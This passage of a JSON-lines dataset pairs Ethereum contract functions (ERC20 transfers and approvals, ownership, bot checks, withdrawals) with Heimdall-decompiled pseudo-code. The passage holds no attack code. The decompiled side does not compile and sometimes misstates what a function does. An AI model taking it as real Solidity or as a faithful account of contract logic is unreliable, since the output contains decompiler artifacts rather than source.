0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6F277374E9329ff8a1DeE8e064929892b69C535C", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function removeBypassRule(address who, bytes4 functionSig, uint256 id) public onlyOwner {\\n        byPassableFunction[who][functionSig] = false;\\n        if (id !=0) {\\n            byPassableIds[who][id] = true;\\n        }\\n    }", "heimdall_decompiled_code": "function removeBypassRule(address arg0, bytes4 arg1, uint256 arg2) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == (uint32(arg1)));\n        require(!(bytes1(isClaimable / 0x0100)), \"Not owner or able to bypass\");\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(bytes1(isClaimable / 0x0100), \"Not owner or able to bypass\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        address var_e = address(arg0);\n        var_f = 0x66;\n        var_e = uint32(arg1);\n        address var_f = keccak256(var_e);\n        storage_map_q[var_e] = uint248(storage_map_q[var_e]);\n        require(!arg2, \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x67;\n        var_e = arg2;\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = 0x01 | (uint248(storage_map_q[var_e]));\n        var_e = msg.sender;\n        var_f = 0x66;\n        var_e = uint32(msg.data[0]);\n        var_f = keccak256(var_e);\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(bytes1(storage_map_q[var_e]), \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x66;\n        var_e = uint32(arg1);\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = uint248(storage_map_q[var_e]);\n        require(!arg2, \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x67;\n        var_e = arg2;\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = 0x01 | (uint248(storage_map_q[var_e]));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n    }"}
{"contract_address": "0x649695aB734cF73FDD08262D5297F0f34368274C", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd4877eAc39dC23770c50dAbcB1F2BC6208893E92", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x0F92AD5f9f111618AAE7F963c44B862A3e24f48c", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x26;\n        var_c = this.code[2305:2343];\n        address var_d = address(arg0);\n        uint256 var_e = 0;\n        require(!(arg2 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        var_d = address(arg0);\n        var_e = 0;\n        storage_map_e[var_d] = storage_map_e[var_d] - arg2;\n        var_d = address(arg1);\n        require(!((arg2 + storage_map_e[var_d]) < storage_map_e[var_d]), \"SafeMath: addition overflow\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_k = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x23;\n        var_n = this.code[2236:2271];\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_m = 0x25;\n        var_n = this.code[2383:2420];\n    }"}
{"contract_address": "0xDE1802eE6Ff990c121b748107Ab34f17b9Bc7978", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 > 0, \"SafeMath: addition overflow\");\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_a[var_a] > (0 + storage_map_a[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((0 + storage_map_a[var_a]) < storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_a[var_a] = 0 + storage_map_a[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_h = 0x40 + var_h;\n        var_d = 0x1e;\n        var_i = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_k = var_h.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(!((storage_map_a[var_a] - arg1) > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_a[var_a] = storage_map_a[var_a] - arg1;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        uint256 var_q = var_h.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        require(!(arg1 - 0) > arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(bytes1(tradingEnabled / 0x010000000000000000000000000000000000000000));\n        require(address(msg.sender) - (address(tradingEnabled)));\n        require(address(arg0) - (address(tradingEnabled)));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        tradingEnabled = 0x01000000000000000000000000000000000000000000 | (uint248(tradingEnabled));\n        var_d = 0x02;\n        var_h = var_h + 0x60;\n        var_t = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_i = address(this);\n        var_o = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_c / 0x01).WETH(var_k); // staticcall\n        var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!((var_h + ret0.length) - var_h) < 0x20);\n        require(var_h.length == (address(var_h.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        uint256 var_j = address(var_h.length);\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_c);\n        address var_b = keccak256(var_a);\n        storage_map_a[var_a] = store_d;\n        var_p = store_d;\n        emit Approval(address(this), address(store_c), store_d);\n        var_p = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_m = store_d;\n        var_q = 0;\n        var_s = 0xa0;\n        uint256 var_u = var_h.length;\n        address var_v = address(this);\n        uint256 var_w = block.timestamp;\n        require(address(store_c).code.length);\n        (bool success, bytes memory ret0) = address(store_c).Unresolved_791ac947(var_m); // call\n        tradingEnabled = uint248(tradingEnabled);\n        (bool success, bytes memory ret0) = address(store_e).transfer(address(this).balance);\n        if (ret0.length == 0) {\n        }\n        var_a = address(this);\n        var_b = 0x01;\n        if (!storage_map_a[var_a] > store_d) {\n        }\n        if (!tradingEnabled / 0x0100000000000000000000000000000000000000000000) {\n        }\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((sellFees == ((sellFees * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((sellFees * arg1) / arg1) == sellFees, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_k = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x40 + var_h;\n        var_d = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64) {\n            if (0x64) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x12;\n                require(0x64, \"Trading is not started\");\n            }\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x12;\n            require(0x64, \"Trading is not started\");\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74207374617274656400000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_k = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool) {\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x5Ea8C15176877338227B79CBc9d14Ed71F0E9250", "original_solidity_code": "function deposit() external payable {\r\n        require(msg.sender == owner, \"Only the owner can deposit funds\");\r\n    }", "heimdall_decompiled_code": "function deposit() public view {\n        require(address(msg.sender) == (address(owner / 0x01)), \"Only the owner can deposit funds\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f6e6c7920746865206f776e65722063616e206465706f7369742066756e6473;\n    }"}
{"contract_address": "0x1c6e35bFEA40f3709DA709f0f2e55604C1F53a1f", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n\r\n        _approve(__owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_a[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = this.code[5293:5330];\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_a[var_a] = storage_map_a[var_a] - arg1;\n        uint256 var_c = storage_map_a[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_a[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[5148:5182];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[5257:5293];\n    }"}
{"contract_address": "0xfC37E6b475e0522fc5B8FBc319dB80a4555B5AeD", "original_solidity_code": "function withdraw(uint256 _pid) public payable onlyAdmin() {\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        paytoken.transfer(msg.sender, paytoken.balanceOf(address(this)));\\n    }", "heimdall_decompiled_code": "function withdraw(uint256 arg0) public payable {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(arg0 < store_e);\n        var_f = 0x0b;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        (bool success, bytes memory ret0) = address(storage_map_t[arg0 * 0x02]).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_g = var_g + (uint248(ret0.length + 0x1f));\n        require(!((var_g + ret0.length) - var_g) < 0x20);\n        var_h = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_c = address(msg.sender);\n        uint256 var_d = var_g.length;\n        (bool success, bytes memory ret0) = address(storage_map_t[arg0 * 0x02]).{ value: 0 ether }Unresolved_a9059cbb(var_c); // call\n        var_g = var_g + (uint248(ret0.length + 0x1f));\n        require(!((var_g + ret0.length) - var_g) < 0x20);\n        require(var_g.length == var_g.length);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x32;\n    }"}
